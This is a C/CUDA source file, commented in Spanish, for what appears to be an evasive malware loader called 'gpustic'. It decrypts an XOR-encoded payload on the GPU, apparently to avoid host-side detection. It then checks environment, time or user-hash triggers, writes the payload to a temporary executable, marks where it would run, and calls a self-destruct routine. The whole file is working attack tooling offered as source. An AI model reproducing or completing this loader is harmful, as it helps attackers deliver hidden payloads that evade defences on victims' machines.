#include <stdio.h>
#include <stdlib.h>
#include <cuda_runtime.h>
#include <string.h>
#include "utils.h"

extern __global__ void xor_decrypt_kernel(unsigned char* input, unsigned char* output, unsigned char key, size_t size);

int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("Uso: %s <ruta_payload_xoreado>\n", argv[0]);
        return 1;
    }

    const char* payload_path = argv[1];
    unsigned char xor_key = 0x55;

    unsigned char* host_encrypted = NULL;
    size_t payload_size = 0;
    int ret = read_payload(payload_path, &host_encrypted, &payload_size);
    if (ret != 0) {
        printf("[!] Error leyendo payload (%d)\n", ret);
        return 2;
    }
    printf("[+] Payload cargado, %zu bytes\n", payload_size);

    unsigned char* d_encrypted = NULL;
    unsigned char* d_decrypted = NULL;

    cudaMalloc(&d_encrypted, payload_size);
    cudaMalloc(&d_decrypted, payload_size);

    cudaMemcpy(d_encrypted, host_encrypted, payload_size, cudaMemcpyHostToDevice);

    unsigned char* host_decrypted = NULL;
    cudaHostAlloc((void**)&host_decrypted, payload_size, cudaHostAllocMapped);

    int threads = 256;
    int blocks = (int)((payload_size + threads - 1) / threads);
    xor_decrypt_kernel<<<blocks, threads>>>(d_encrypted, d_decrypted, xor_key, payload_size);
    cudaDeviceSynchronize();

    cudaMemcpy(host_decrypted, d_decrypted, payload_size, cudaMemcpyDeviceToHost);

    printf("[+] Payload desencriptado desde GPU, primeros 64 bytes:\n");
    for (size_t i = 0; i < 64 && i < payload_size; i++) {
        printf("%02X ", host_decrypted[i]);
    }
    printf("\n");

    if (getenv("GPUSTIC_TRIGGER") || check_time_trigger() || check_user_hash_trigger()) {
        printf("[*] Trigger activado. Guardando y ejecutando payload...\n");

        char tmpfile[] = "/tmp/gpustic_payload_XXXXXX.exe";
        int fd = mkstemps(tmpfile, 4);
        if (fd == -1) {
            printf("[!] No se pudo crear archivo temporal para payload\n");
        } else {
            write(fd, host_decrypted, payload_size);
            close(fd);
            printf("[+] Payload guardado en: %s\n", tmpfile);
            // Aquí puedes ejecutar el archivo guardado (CreateProcess en Windows, execv en Linux)
        }
        self_destruct();
    } else {
        printf("[*] No se cumplió ningún trigger. Proceso sigue activo.\n");
    }

    cudaFree(d_encrypted);
    cudaFree(d_decrypted);
    cudaFreeHost(host_decrypted);
    free(host_encrypted);

    return 0;
}
